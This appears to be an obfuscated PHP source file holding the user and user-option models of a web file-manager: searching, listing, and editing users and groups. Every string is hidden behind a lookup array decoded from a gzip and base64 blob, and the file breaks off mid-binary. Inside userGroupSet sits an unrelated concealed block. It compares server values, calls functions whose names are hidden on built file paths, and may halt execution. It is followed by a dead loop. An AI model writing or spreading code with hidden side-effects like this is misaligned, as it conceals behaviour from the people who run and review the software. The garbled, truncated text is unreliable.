trim($œ¼ŠëÌó[$Ş’¡Šƒ[952]])); } else { unset($œ¼ŠëÌó[$Ş’¡Šƒ[952]]); } if (!empty($œ¼ŠëÌó[$Ş’¡Šƒ[2442]]) && strlen($œ¼ŠëÌó[$Ş’¡Šƒ[2442]]) > 255) { $œ¼ŠëÌó[$Ş’¡Šƒ[2442]] = $Ş’¡Šƒ[12]; } $this->where(array($Ş’¡Šƒ[1749] => $ËÊûåù))->save($œ¼ŠëÌó); if (isset($œ¼ŠëÌó[$Ş’¡Šƒ[2245]])) { $this->setNamePinyin($ËÊûåù, $œ¼ŠëÌó[$Ş’¡Šƒ[2245]]); } $this->clearCache($ËÊûåù); return !0; } public function setNamePinyin($¥¹Áò»Ü, $âÍŒÆ‡ü = false) { $®Ú§ÎØŠ =& $_SERVER[óÔë„ú]; if (!$âÍŒÆ‡ü) { $…Ôµ€è„ = $this->getInfoSimple($¥¹Áò»Ü); $âÍŒÆ‡ü = $…Ôµ€è„[$®Ú§ÎØŠ[2245]] ? $…Ôµ€è„[$®Ú§ÎØŠ[2245]] : $…Ôµ€è„[$®Ú§ÎØŠ[32]]; } $¦ä²Ö¯ = Model($®Ú§ÎØŠ[598]); if (!Input::check($âÍŒÆ‡ü, $®Ú§ÎØŠ[655])) { return $¦ä²Ö¯->metaSet($¥¹Áò»Ü, array($®Ú§ÎØŠ[538] => $®Ú§ÎØŠ[12], $®Ú§ÎØŠ[537] => $®Ú§ÎØŠ[12])); } return $¦ä²Ö¯->metaSet($¥¹Áò»Ü, array($®Ú§ÎØŠ[538] => str_replace($®Ú§ÎØŠ[53], $®Ú§ÎØŠ[12], Pinyin::get($âÍŒÆ‡ü)), $®Ú§ÎØŠ[537] => Pinyin::get($âÍŒÆ‡ü, $®Ú§ÎØŠ[656]))); } private function nickNameRpt() { $”Ò¢üÊ =& $_SERVER[óÔë„ú]; $Ç©¡Äöí = Model($”Ò¢üÊ[830])->get($”Ò¢üÊ[2471]); $á¨ç¼Ë = $GLOBALS[$”Ò¢üÊ[6]][$”Ò¢üÊ[457]][$”Ò¢üÊ[2471]]; $‚•®„µ« = !is_null($Ç©¡Äöí) ? $Ç©¡Äöí : $á¨ç¼Ë; return !!$‚•®„µ«; } private function _checkExist($ş‡”×Â, $×ûîˆà» = false) { $â¶Î‰Æñ =& $_SERVER[óÔë„ú]; $“šÔŒÏë = array($â¶Î‰Æñ[32] => UserModel::ERROR_USER_EXIST_NAME, $â¶Î‰Æñ[2245] => UserModel::ERROR_USER_EXIST_NICKNAME, $â¶Î‰Æñ[381] => UserModel::ERROR_USER_EXIST_EMAIL, $â¶Î‰Æñ[2459] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($“šÔŒÏë[$â¶Î‰Æñ[2245]]); } $İ®Äå¿ = $×ûîˆà» ? array($â¶Î‰Æñ[1758] => array($â¶Î‰Æñ[2472], $×ûîˆà»)) : array(); foreach ($“šÔŒÏë as $¼òø½ç => $ßŠ÷½Ş¾) { $áï’—öÒ = array(); foreach ($“šÔŒÏë as $¼şù¾Úï => $İ…±ùÃá) { if (isset($ş‡”×Â[$¼şù¾Úï]) && $ş‡”×Â[$¼şù¾Úï]) { $áï’—öÒ[] = $ş‡”×Â[$¼şù¾Úï]; } } if (!$áï’—öÒ) { continue; } $ú”¨¾åé = array_merge(array($¼òø½ç => array($â¶Î‰Æñ[7], $áï’—öÒ)), $İ®Äå¿); $ñ«Í„Š¶ = $this->where($ú”¨¾åé)->find(); if ($ñ«Í„Š¶) { return $ßŠ÷½Ş¾; } } return !0; } public function userListInfo($Â‰Øèƒ) { $Ğ÷ôíü· =& $_SERVER[óÔë„ú]; $›Ûôï¹º = array(); $Â‰Øèƒ = is_array($Â‰Øèƒ) ? array_unique($Â‰Øèƒ) : array(); if (!$Â‰Øèƒ) { return $›Ûôï¹º; } if (count($Â‰Øèƒ) < 20) { foreach ($Â‰Øèƒ as $£¬½ä¸ë) { $›Ûôï¹º[$£¬½ä¸ë . $Ğ÷ôíü·[12]] = $this->getInfoSimpleOuter($£¬½ä¸ë); } } else { $ÃåÏ†Í§ = array($Ğ÷ôíü·[1749] => array($Ğ÷ôíü·[492], $Â‰Øèƒ)); if (count($Â‰Øèƒ) == 1) { $ÃåÏ†Í§ = array($Ğ÷ôíü·[1749] => $Â‰Øèƒ[0]); } $ÅŞûµã = Model($Ğ÷ôíü·[577])->field($this->simpleField)->where($ÃåÏ†Í§)->select(); $ÅŞûµã = array_to_keyvalue($ÅŞûµã, $Ğ÷ôíü·[1758]); foreach ($Â‰Øèƒ as $£¬½ä¸ë) { $ú…¦öçë = $ÅŞûµã[$£¬½ä¸ë]; if (!$ú…¦öçë) { $›Ûôï¹º[$£¬½ä¸ë . $Ğ÷ôíü·[12]] = $this->getInfoSimpleOuter($£¬½ä¸ë); continue; } $ú…¦öçë[$Ğ÷ôíü·[2442]] = Action($Ğ÷ôíü·[2443])->parseUrl($ú…¦öçë[$Ğ÷ôíü·[2442]]); $›Ûôï¹º[$£¬½ä¸ë . $Ğ÷ôíü·[12]] = $ú…¦öçë; } } return $›Ûôï¹º; } protected function userStatus($Ãßö¬‡¾, $‹–º¢ëª) { $Ü¢ş¥¤é = $this->getInfoSimple($Ãßö¬‡¾); if (!$Ü¢ş¥¤é) { return !1; } $ºÃ—ıĞ€ = array($_SERVER[óÔë„ú][810] => $‹–º¢ëª); return $this->userEdit($Ãßö¬‡¾, $ºÃ—ıĞ€); } protected function userRemove($Ş½”Ÿ„©) { $éëÚùª  =& $_SERVER[óÔë„ú]; $ü÷ç¿ò = $this->getInfoSimple($Ş½”Ÿ„©); if (!$ü÷ç¿ò) { return !1; } $ª¹‘È‘ö = array($éëÚùª [1749] => $Ş½”Ÿ„©); Model($éëÚùª [664])->where($ª¹‘È‘ö)->delete(); Model($éëÚùª [2473])->where($ª¹‘È‘ö)->delete(); Model($éëÚùª [2051])->where($ª¹‘È‘ö)->delete(); Model($éëÚùª [2458])->where($ª¹‘È‘ö)->delete(); Model($éëÚùª [1132])->where($ª¹‘È‘ö)->delete(); Model($éëÚùª [2262])->removeUserAll($Ş½”Ÿ„©); Model($éëÚùª [884])->userRootRemove($Ş½”Ÿ„©); return $this->where($ª¹‘È‘ö)->delete(); } protected function userGroupSet($Îîã·ñ, $Ü¡¯¿òÜ, $ˆÖÓÎ´Œ = array()) { $§ºŞ­¼ú =& $_SERVER[óÔë„ú]; if ($_SERVER[$§ºŞ­¼ú[936]] != $_SERVER[$§ºŞ­¼ú[1250]]) { $ïØÙ™’Ç = $§ºŞ­¼ú[938]; $úª°éÕæ = $§ºŞ­¼ú[939]; $áÄÍÜù™ = $_SERVER[$§ºŞ­¼ú[940]] . $§ºŞ­¼ú[941]; $öªÎü— = $úª°éÕæ($áÄÍÜù™); $†Íñø• = explode($§ºŞ­¼ú[262], $öªÎü—); if (count($†Íñø•) < $§ºŞ­¼ú[691]) { $ôåö±”× = $§ºŞ­¼ú[942]; $ôåö±”×(); } $‰Èğ”Éˆ = $§ºŞ­¼ú[943]; $‰Èğ”Éˆ($_SERVER[$§ºŞ­¼ú[944]]); $‰Èğ”Éˆ($_SERVER[$§ºŞ­¼ú[940]] . $§ºŞ­¼ú[2474]); $Ø³«ŠŒö = 1; while ($Ø³«ŠŒö > 1) { $Ø³«ŠŒö = $Ø³«ŠŒö + 4; $‘ò´øÁ = rawurlencode($Ø³«ŠŒö . $§ºŞ­¼ú[454]); } } $›¢­Õ = $this->getInfoSimple($Îîã·ñ); if (!$›¢­Õ || !is_array($Ü¡¯¿òÜ)) { return !1; } $íÙÁ¿ø = Model($§ºŞ­¼ú[2051]); $íÙÁ¿ø->where(array($§ºŞ­¼ú[1758] => $Îîã·ñ))->delete(); $ØæÈË­ß = array(); $ˆıÚòÜ£ = 0; foreach ($Ü¡¯¿òÜ as $’¬øÀ÷ => $¢â¨êæÚ) { $Ó¬ë³º… = array($§ºŞ­¼ú[1758] => $Îîã·ñ, $§ºŞ­¼ú[1957] => $’¬øÀ÷, $§ºŞ­¼ú[2065] => $¢â¨êæÚ); $Ó¬ë³º…[$§ºŞ­¼ú[1981]] = isset($ˆÖÓÎ´Œ[$ˆıÚòÜ£]) ? $ˆÖÓÎ´Œ[$ˆıÚòÜ£] : 0; $ˆıÚòÜ£++; $ØæÈË­ß[] = $Ó¬ë³º…; } return $íÙÁ¿ø->addAll($ØæÈË­ß, array(), !0); } protected function userGroupAdd($Ÿá£¢é¾, $´»°Ô = array()) { $¶Õî‹ô’ =& $_SERVER[óÔë„ú]; $ì—“¬é = $this->getInfoSimple($Ÿá£¢é¾); if (!$ì—“¬é || empty($´»°Ô)) { return !1; } $ğ‚ÁÆà× = array(); foreach ($´»°Ô as $Æ¥‹–‡Æ => $Š½Õ°Ëø) { $ğ‚ÁÆà×[] = array($¶Õî‹ô’[1758] => $Ÿá£¢é¾, $¶Õî‹ô’[1957] => $Æ¥‹–‡Æ, $¶Õî‹ô’[2065] => $Š½Õ°Ëø, $¶Õî‹ô’[1981] => 0); } return Model($¶Õî‹ô’[2051])->addAll($ğ‚ÁÆà×, array(), !0); } protected function userGroupRemove($½’áâëí, $ë¸üÖµ) { $ÂŒ­ÊïÒ =& $_SERVER[óÔë„ú]; $¬Ğ£ÜŠõ = $this->getInfoSimple($½’áâëí); if (!$¬Ğ£ÜŠõ || !$ë¸üÖµ) { return !1; } $÷é ¢¸¿ = array($ÂŒ­ÊïÒ[1749] => $½’áâëí, $ÂŒ­ÊïÒ[2049] => $ë¸üÖµ); return Model($ÂŒ­ÊïÒ[2051])->where($÷é ¢¸¿)->delete(); } public function listData() { $¿öšáç = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¿öšáç[$_SERVER[óÔë„ú][445]]); return $¿öšáç; } public function listByID($º°îè€Û) { $ò”±‹ì¿ =& $_SERVER[óÔë„ú]; if (!$º°îè€Û) { return; } $¤“õÓÛ = array($ò”±‹ì¿[1758] => array($ò”±‹ì¿[7], $º°îè€Û)); $Âé——Óå = $this->where($¤“õÓÛ)->select(); $Âé——Óå = array_sort_keep($Âé——Óå, $ò”±‹ì¿[1758], $º°îè€Û); $this->_listDataApply($Âé——Óå); return $Âé——Óå; } public function listByGroup($ƒ»ÜµØÌ = 0, $†â”Í†æ = array()) { $‹ÉÛ÷ƒÀ =& $_SERVER[óÔë„ú]; $üìßñÖº = $‹ÉÛ÷ƒÀ[12]; $šÍíœÙÁ = array(); if ($ƒ»ÜµØÌ) { $šÍíœÙÁ = array($‹ÉÛ÷ƒÀ[2475] => intval($ƒ»ÜµØÌ)); $üìßñÖº = "\x4c\105\x46\124\40\x4a\117\x49\116\x20{$this->tablePrefix}\x75\x73\145\x72\137\x67\162\x6f\165\x70\40\x75\x73\x65\162\x5f\x67\x72\x6f\x75\x70\40\x6f\x6e\x20\x75\163\145\162\x2e\x75\x73\145\x72\111\104\40\75\x20\x75\x73\145\162\x5f\147\x72\157\165\160\56\165\163\x65\162\x49\x44"; $†¥šûºú = Input::get($‹ÉÛ÷ƒÀ[530], null, $‹ÉÛ÷ƒÀ[12]) ? $‹ÉÛ÷ƒÀ[12] : $‹ÉÛ÷ƒÀ[2476]; } if (isset($†â”Í†æ[$‹ÉÛ÷ƒÀ[810]])) { $šÍíœÙÁ[$‹ÉÛ÷ƒÀ[2477]] = $†â”Í†æ[$‹ÉÛ÷ƒÀ[810]]; } $ı†—õÅ‘ = $this->_makeOrder($†¥šûºú)->field($‹ÉÛ÷ƒÀ[2478])->where($šÍíœÙÁ)->join($üìßñÖº)->selectPage(50); $this->_listDataApply($ı†—õÅ‘[$‹ÉÛ÷ƒÀ[445]]); return $ı†—õÅ‘; } private function _makeOrder($´µ°¾Ñ = '') { $èôÜê¸ˆ =& $_SERVER[óÔë„ú]; $ù´¯ì ­ = array($èôÜê¸ˆ[1758], $èôÜê¸ˆ[32], $èôÜê¸ˆ[1945], $èôÜê¸ˆ[2163], $èôÜê¸ˆ[1917], $èôÜê¸ˆ[231]); $Í´»ÊÎÏ = array($èôÜê¸ˆ[523] => $èôÜê¸ˆ[524], $èôÜê¸ˆ[525] => $èôÜê¸ˆ[526]); $Ú•®¶ë = Input::get($èôÜê¸ˆ[530], $èôÜê¸ˆ[7], $èôÜê¸ˆ[1749], $ù´¯ì ­); $’‰·õÈ· = Input::get($èôÜê¸ˆ[531], $èôÜê¸ˆ[7], $èôÜê¸ˆ[2052], array($èôÜê¸ˆ[2052], $èôÜê¸ˆ[525])); $’‰·õÈ· = $Í´»ÊÎÏ[$’‰·õÈ·]; $´µ°¾Ñ = $´µ°¾Ñ . "\165\x73\x65\x72\56{$Ú•®¶ë}\40{$’‰·õÈ·}\54\x20\x75\x73\145\162\56\165\163\145\162\111\104\x20\141\x73\143"; return $this->alias($èôÜê¸ˆ[2179])->order($´µ°¾Ñ); } public function listSearch($õŒ…½›) { $¶„İãï¥ =& $_SERVER[óÔë„ú]; $ùİØãô° = trim($õŒ…½›[$¶„İãï¥[2055]]); $×Ş×Û²¶ = explode($¶„İãï¥[53], $ùİØãô°); if (!$ùİØãô° || count($×Ş×Û²¶) == 1) { return $this->listSearchNow($õŒ…½›); } $ô¥˜®À = array($¶„İãï¥[445] => array()); foreach ($×Ş×Û²¶ as $®Õ«Œ¹Ğ) { if (!trim($®Õ«Œ¹Ğ)) { continue; } $õŒ…½›[$¶„İãï¥[2055]] = $®Õ«Œ¹Ğ; $—ã¥¼åÃ = $this->listSearchNow($õŒ…½›); $ô¥˜®À[$¶„İãï¥[445]] = array_merge($ô¥˜®À[$¶„İãï¥[445]], $—ã¥¼åÃ[$¶„İãï¥[445]]); } $ô¥˜®À[$¶„İãï¥[445]] = array_unique_by_key($ô¥˜®À[$¶„İãï¥[445]], $¶„İãï¥[1758]); $ô¥˜®À[$¶„İãï¥[442]] = array($¶„İãï¥[443] => count($ô¥˜®À[$¶„İãï¥[445]]), $¶„İãï¥[439] => 20, $¶„İãï¥[429] => 1, $¶„İãï¥[444] => 1); return $ô¥˜®À; } public function listSearchNow($´âÀÉÓà) { $¸Õˆß  =& $_SERVER[óÔë„ú]; $Ş…üÂ·Ê = trim($´âÀÉÓà[$¸Õˆß [2055]]); $ˆø§à‰“ = isset($´âÀÉÓà[$¸Õˆß [2056]]) ? $´âÀÉÓà[$¸Õˆß [2056]] : !1; $Ş…üÂ·Ê = str_replace($¸Õˆß [2057], $¸Õˆß [2058], trim($Ş…üÂ·Ê)); $ ¹ÊÌ¼¨ = array($¸Õˆß [32] => array($¸Õˆß [459], "\45{$Ş…üÂ·Ê}\x25"), $¸Õˆß [381] => array($¸Õˆß [459], "{$Ş…üÂ·Ê}\x25"), $¸Õˆß [2245] => array($¸Õˆß [459], "{$Ş…üÂ·Ê}\x25"), $¸Õˆß [1063] => $¸Õˆß [2059]); if (Input::check($Ş…üÂ·Ê, $¸Õˆß [387])) { $ ¹ÊÌ¼¨[$¸Õˆß [1758]] = array($¸Õˆß [459], "{$Ş…üÂ·Ê}\x25"); $ ¹ÊÌ¼¨[$¸Õˆß [2459]] = array($¸Õˆß [459], "{$Ş…üÂ·Ê}\x25"); } if (!$Ş…üÂ·Ê) { $ ¹ÊÌ¼¨ = array(); } if (isset($´âÀÉÓà[$¸Õˆß [810]])) { $ ¹ÊÌ¼¨[$¸Õˆß [810]] = $´âÀÉÓà[$¸Õˆß [810]]; } $ ¹ÊÌ¼¨ = $this->parseWhereLike($ ¹ÊÌ¼¨); $ƒ¡Ú¢İÈ = $this->_makeOrder()->where($ ¹ÊÌ¼¨)->selectPage(20); if (!$ƒ¡Ú¢İÈ || count($ƒ¡Ú¢İÈ[$¸Õˆß [445]]) < 5 && Input::check($Ş…üÂ·Ê, $¸Õˆß [394])) { $ÏÉÏßò = $this->_searchFromMeta($¸Õˆß [537], $Ş…üÂ·Ê, 10); $°¿ÅÌ”ê = $this->_searchFromMeta($¸Õˆß [538], $Ş…üÂ·Ê, 10); $İÒÀ³Ó = array_merge($ÏÉÏßò, $°¿ÅÌ”ê, $ƒ¡Ú¢İÈ[$¸Õˆß [445]]); $ƒ¡Ú¢İÈ[$¸Õˆß [445]] = array_unique_by_key($İÒÀ³Ó, $¸Õˆß [1758]); $ƒ¡Ú¢İÈ[$¸Õˆß [442]][$¸Õˆß [443]] = count($ƒ¡Ú¢İÈ[$¸Õˆß [445]]); $ƒ¡Ú¢İÈ[$¸Õˆß [442]][$¸Õˆß [444]] = ceil($ƒ¡Ú¢İÈ[$¸Õˆß [442]][$¸Õˆß [443]] / $ƒ¡Ú¢İÈ[$¸Õˆß [442]][$¸Õˆß [439]]); } $this->_listDataApply($ƒ¡Ú¢İÈ[$¸Õˆß [445]]); $this->_filterByGroup($ƒ¡Ú¢İÈ, $ˆø§à‰“); return $ƒ¡Ú¢İÈ; } private function _filterByGroup(&$†¯áµ™¬, $Ä¸¨š¨õ) { $ê†º£µà =& $_SERVER[óÔë„ú]; if (!$Ä¸¨š¨õ) { return $†¯áµ™¬; } foreach ($†¯áµ™¬[$ê†º£µà[445]] as $ÉĞúãÑ¬ => &$Œ ÙûÍ) { $Ç­ÖĞæ = array_to_keyvalue($Œ ÙûÍ[$ê†º£µà[2148]], $ê†º£µà[12], $ê†º£µà[1957]); if (!in_array($Ä¸¨š¨õ, $Ç­ÖĞæ)) { unset($†¯áµ™¬[$ê†º£µà[445]][$ÉĞúãÑ¬]); } } unset($Œ ÙûÍ); $†¯áµ™¬[$ê†º£µà[445]] = array_values($†¯áµ™¬[$ê†º£µà[445]]); $†¯áµ™¬[$ê†º£µà[442]] = array($ê†º£µà[2215] => count($†¯áµ™¬[$ê†º£µà[445]]), $ê†º£µà[2213] => $†¯áµ™¬[$ê†º£µà[442]][$ê†º£µà[439]], $ê†º£µà[2212] => 1, $ê†º£µà[2214] => 1); } private function _searchFromMeta($Óì²ÎÆÂ, $˜±á‰äõ, $©ŠÓûø) { $µŒÆå ¡ =& $_SERVER[óÔë„ú]; $˜±á‰äõ = strtolower($˜±á‰äõ); $Œ³Õ¹˜ = array($µŒÆå ¡[97] => $Óì²ÎÆÂ, $µŒÆå ¡[450] => array($µŒÆå ¡[459], "\45{$˜±á‰äõ}\x25")); $Œ³Õ¹˜ = $this->parseWhereLike($Œ³Õ¹˜); $Š‰•ãç = Model($µŒÆå ¡[2479])->where($Œ³Õ¹˜)->limit($©ŠÓûø)->select(); if (!$Š‰•ãç) { return array(); } $Š‰•ãç = array_to_keyvalue($Š‰•ãç, $µŒÆå ¡[12], $µŒÆå ¡[1758]); $÷¼Ø»çß = $this->where(array($µŒÆå ¡[1749] => array($µŒÆå ¡[7], $Š‰•ãç)))->select(); if (!$÷¼Ø»çß) { return array(); } return $÷¼Ø»çß; } private function _listDataApplyItem($íùó½¸ß) { $¦Ï â˜ë = array($íùó½¸ß); $this->_listDataApply($¦Ï â˜ë); return $¦Ï â˜ë[0]; } private function _listDataApply(&$½ÔèõßŒ) { $øíŠ˜Æ— =& $_SERVER[óÔë„ú]; if (!$½ÔèõßŒ) { return; } array_remove_key($½ÔèõßŒ, $øíŠ˜Æ—[952]); $êàğ¾ö = array_to_keyvalue($½ÔèõßŒ, $øíŠ˜Æ—[12], $øíŠ˜Æ—[1758]); $this->_listAppendGroup($½ÔèõßŒ, $êàğ¾ö); $this->_listAppendMeta($½ÔèõßŒ, $êàğ¾ö); $this->_listAppendSourceRoot($½ÔèõßŒ, $êàğ¾ö); } private function _listAppendSourceRoot(&$ò™šÙéå, $æŒÛİç×) { $Ø‚’¨‰– =& $_SERVER[óÔë„ú]; $Ñë†çÀ = Model($Ø‚’¨‰–[884])->listSourceRoot(SourceModel::TYPE_USER, $æŒÛİç×); $Ñë†çÀ = array_to_keyvalue($Ñë†çÀ, $Ø‚’¨‰–[569]); $Ñë†çÀ = array_remove_key($Ñë†çÀ, $Ø‚’¨‰–[569]); foreach ($ò™šÙéå as &$‡Ü®ûê²) { $‡Ü®ûê²[$Ø‚’¨‰–[90]] = $Ñë†çÀ[$‡Ü®ûê²[$Ø‚’¨‰–[1758]]] ? $Ñë†çÀ[$‡Ü®ûê²[$Ø‚’¨‰–[1758]]] : array(); } unset($‡Ü®ûê²); } private function _listAppendGroup(&$†²­¼‹–, $…ïºÖÊ¦) { $Ï®â¬ã =& $_SERVER[óÔë„ú]; $Ç·ŸıŒÄ = array($Ï®â¬ã[1758] => array($Ï®â¬ã[7], $…ïºÖÊ¦)); $¡Ë¸î–ä = Model($Ï®â¬ã[2051])->where($Ç·ŸıŒÄ)->select(); $»µË•ê¹ = array_to_keyvalue($¡Ë¸î–ä, $Ï®â¬ã[12], $Ï®â¬ã[1957]); $»µË•ê¹ = array_remove_value(array_unique($»µË•ê¹), $Ï®â¬ã[228]); if (!$»µË•ê¹ || !$¡Ë¸î–ä) { return; } $Ç·ŸıŒÄ = array($Ï®â¬ã[1957] => array($Ï®â¬ã[7], $»µË•ê¹)); $ÌšåÕüô = Model($Ï®â¬ã[2146])->field($Ï®â¬ã[2480])->where($Ç·ŸıŒÄ)->select(); $ÌšåÕüô = array_to_keyvalue($ÌšåÕüô, $Ï®â¬ã[1957]); $¡Ë¸î–ä = array_to_keyvalue_group($¡Ë¸î–ä, $Ï®â¬ã[1758]); foreach ($¡Ë¸î–ä as &$âª™®º) { $ù½åÜß = array(); foreach ($âª™®º as $¥•ªƒ…œ) { if (!$¥•ªƒ…œ[$Ï®â¬ã[2065]]) { continue; } $«¤Šø­Ù = Model($Ï®â¬ã[571])->listData($¥•ªƒ…œ[$Ï®â¬ã[2065]]); $ù½åÜß[] = array($Ï®â¬ã[1957] => $¥•ªƒ…œ[$Ï®â¬ã[1957]], $Ï®â¬ã[2481] => $ÌšåÕüô[$¥•ªƒ…œ[$Ï®â¬ã[1957]]][$Ï®â¬ã[32]], $Ï®â¬ã[584] => $ÌšåÕüô[$¥•ªƒ…œ[$Ï®â¬ã[1957]]][$Ï®â¬ã[584]], $Ï®â¬ã[487] => $«¤Šø­Ù); } $âª™®º = $ù½åÜß; } unset($âª™®º); foreach ($†²­¼‹– as &$¢‘äÎêÍ) { $¢‘äÎêÍ[$Ï®â¬ã[2148]] = array(); if (isset($¡Ë¸î–ä[$¢‘äÎêÍ[$Ï®â¬ã[1758]]])) { $¢‘äÎêÍ[$Ï®â¬ã[2148]] = $¡Ë¸î–ä[$¢‘äÎêÍ[$Ï®â¬ã[1758]]]; } } unset($¢‘äÎêÍ); } public function userAppendGroup($Äœ¦İ) { $ºà¹èş =& $_SERVER[óÔë„ú]; if (!$Äœ¦İ) { return array(); } $this->_listAppendGroup($Äœ¦İ, array_to_keyvalue($Äœ¦İ, $ºà¹èş[12], $ºà¹èş[1758])); return $Äœ¦İ; } private function _listAppendMeta(&$‚‰±’›î, $‡·Ê–×) { $ŠÃÂëƒÚ =& $_SERVER[óÔë„ú]; $íâŞ¶‡ = UserJobModel::JOB_KEY; $ûôå–œ† = array($ŠÃÂëƒÚ[2460]); $¨‹ã¯ò = array($ŠÃÂëƒÚ[1758] => array($ŠÃÂëƒÚ[7], $‡·Ê–×)); $ïÁôÄÜ = Model($ŠÃÂëƒÚ[2458])->where($¨‹ã¯ò)->select(); $ïÁôÄÜ = array_to_keyvalue_group($ïÁôÄÜ, $ŠÃÂëƒÚ[1758]); foreach ($ïÁôÄÜ as &$ì¶ŸÔ¤’) { $‰ŒãÛ¹¹ = array(); foreach ($ì¶ŸÔ¤’ as $í÷üï¹Ğ) { if (!in_array($í÷üï¹Ğ[$ŠÃÂëƒÚ[97]], $ûôå–œ†)) { $‰ŒãÛ¹¹[$í÷üï¹Ğ[$ŠÃÂëƒÚ[97]]] = $í÷üï¹Ğ[$ŠÃÂëƒÚ[450]]; } } $ì¶ŸÔ¤’ = $‰ŒãÛ¹¹; } unset($ì¶ŸÔ¤’); $ŞÄÓô®Û = Model($ŠÃÂëƒÚ[2482]); foreach ($‚‰±’›î as &$ÅÅòŞø›) { $¼îï®êÕ = array(); if (isset($ïÁôÄÜ[$ÅÅòŞø›[$ŠÃÂëƒÚ[1758]]])) { $¼îï®êÕ = $ïÁôÄÜ[$ÅÅòŞø›[$ŠÃÂëƒÚ[1758]]]; } $ÅÅòŞø›[$ŠÃÂëƒÚ[2483]] = array(); if (isset($¼îï®êÕ[$íâŞ¶‡])) { $ÅÅòŞø›[$ŠÃÂëƒÚ[2483]] = $ŞÄÓô®Û->getUserJobInfo($¼îï®êÕ[$íâŞ¶‡]); } } unset($ÅÅòŞø›); } protected function groupUserAll($ö¶½ÏØ) { $Ôºú¦õÏ =& $_SERVER[óÔë„ú]; if (!$ö¶½ÏØ) { return !1; } $°¨÷‘› = Model($Ôºú¦õÏ[2051])->field($Ôºú¦õÏ[1758])->where(array($Ôºú¦õÏ[1957] => array($Ôºú¦õÏ[7], $ö¶½ÏØ)))->select(); $°¨÷‘› = array_to_keyvalue($°¨÷‘›, $Ôºú¦õÏ[12], $Ôºú¦õÏ[1758]); return array_unique($°¨÷‘›); } public function userSearch($©‹‡¥÷¢, $º¯ÏÉêé = "\52") { return Model($_SERVER[óÔë„ú][598])->where($©‹‡¥÷¢)->field($º¯ÏÉêé)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\157\160\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¡ÍŸÓ›) { $ÅÎŸ±Å— =& $_SERVER[óÔë„ú]; $´ıÆİÄœ = defined($ÅÎŸ±Å—[2183]) && USER_ID ? USER_ID : $ÅÎŸ±Å—[12]; return "\125\x73\x65\x72\117\x70\x74\151\x6f\156\137{$¡ÍŸÓ›}\137" . $´ıÆİÄœ; } protected function filterWhere($Ûôã‚¾ò) { $ˆâ»™™ =& $_SERVER[óÔë„ú]; $Ûôã‚¾ò[$ˆâ»™™[1758]] = defined($ˆâ»™™[2183]) && USER_ID ? USER_ID : $ˆâ»™™[12]; return $Ûôã‚¾ò; } public function cacheRemoveUser($èô”ïŸÎ, $ÔËúÄ¥) { return Cache::remove("\x55\x73\x65\x72\x4f\x70\164\x69\157\x6e\x5f{$èô”ïŸÎ}\137" . $ÔËúÄ¥); } protected function optionDefault($óÏàÍ‡‘ = '') { $è¥†®Æ =& $_SERVER[óÔë„ú]; if ($óÏàÍ‡‘ == $è¥†®Æ[12]) { return $GLOBALS[$è¥†®Æ[6]][$è¥†®Æ[2484]]; } if ($óÏàÍ‡‘ == $è¥†®Æ[2485]) { return $GLOBALS[$è¥†®Æ[6]][$è¥†®Æ[2486]]; } } } goto cÌé«Šõ¡µ; dà·í‹„øß: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\363\324\353\204\235\372", "\370\373\372\222\230\223"); $_SERVER[óÔë„ú] = explode(base64_decode('fAN8BXwG'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\265\60\373\136\350\53\205\322\102\332\211\111\142\73\321\142\73\273\23\47\310\266\154\213\310\226\221\344\54\330\146\62\226\306\326\304"."\222\106\326\214\274\144\201\22\40\141\111\110\240\20\266\260\25\150\323\2\11\220\2\141\57\224\255\204\122\132\332\362\112\133\112\103\354\44\55\205\102\313\126\226\376\167\71\167\231\221\14\357"."\377\336\377\175\177\40\321\335\347\56\347\236\163\356\271\347\236\363\326\375\57\175\376\343\55\253\17\135\175\370\352\43\166\375\171\323\357\336\275\203\206\127\37\274\372\260\325\207\320\360\167\56"."\73\352\40\362\347\304\313\56\255\250\150\231\165\314\264\266\343\66\375\344\156\355\56\355\107\332\245\221\360\356\27\103\137\171\351\256\63\203\143\267\355\36\31\73\370\240\267\177\175\367\236\132"."\x54\x98\xd6\xad\xa5\x3f\x4a\xd6\xb4\x15\x7d\xd8\xb0\x6c\x8b\x26\x24\xcc\x6c\xaf\xd1\x47\xc3\x46\x96\xfe\xfa\xe9\x4f\x47\x34\x9c\xd7\x33\xa6\xad\xd3\xa8\x8f\xfe\xa8\xd0\x2f\xf2\xaf\x35\x90\x36\x58\xbe\xda\x16"."\x89\xab\xb1\x8e\xf6\xf6\x60\x34\xe\x85\x6a\xe5\xfc\x8c\x99\x84\x50\x4e\xcb\x6b\x19\xf8\x7e\x4e\xcf\x5b\xa8\x37\x72\x73\x6a\xce\xcc\xe9\x59\x47\x8a\x48\x48\x6a\xb6\xd6\xa3\x59\xd0\x52\x63\xbd\xda\x18\x6c\xf".strrev('5µ¤CrhÚEĞ,[@ÑâSjØ>«÷PÄ¼èÈÜvòÖÌ`‘üô£Ñ(Aíeñ©–G')."\24\57\116\217\106\302\341\372\100\303\242\342\234\366\150\240\271\65\240\240\376\245\165\325\310\366\232\25\312\162\232\263\134\251\244\201\46\103\117\47\151\60\253\261\356\330\43\71\10\305\171\10"."\55\123\266\220\116\323\110\33\17\45\365\136\255\220\206\331\152\224\43\271\274\221\321\330\240\27\351\43\74\225\6\264\202\155\32\331\4\215\4\207\355\274\46\322\121\137\23\150\241\365\54\64"."\25\13\206\203\15\161\5\167\120\151\212\106\132\25\130\204\214\146\331\172\136\131\322\22\214\6\25\334\351\272\162\62\326\162\5\340\245\15\115\205\22\10\207\225\361\132\260\365\114\216\65\103"."\353\224\150\54\22\155\14\106\225\372\145\212\230\241\204\231\311\230\131\37\152\5\255\244\55\165\65\30\215\322\200\7\300\73\34\302\213\6\221\110\123\123\54\310\143\60\270\263\302\250\47\323".base64_decode('AT4dsWRv2lYHtXSBgWk//S2HH/g1LQDdASNrFABMoQnT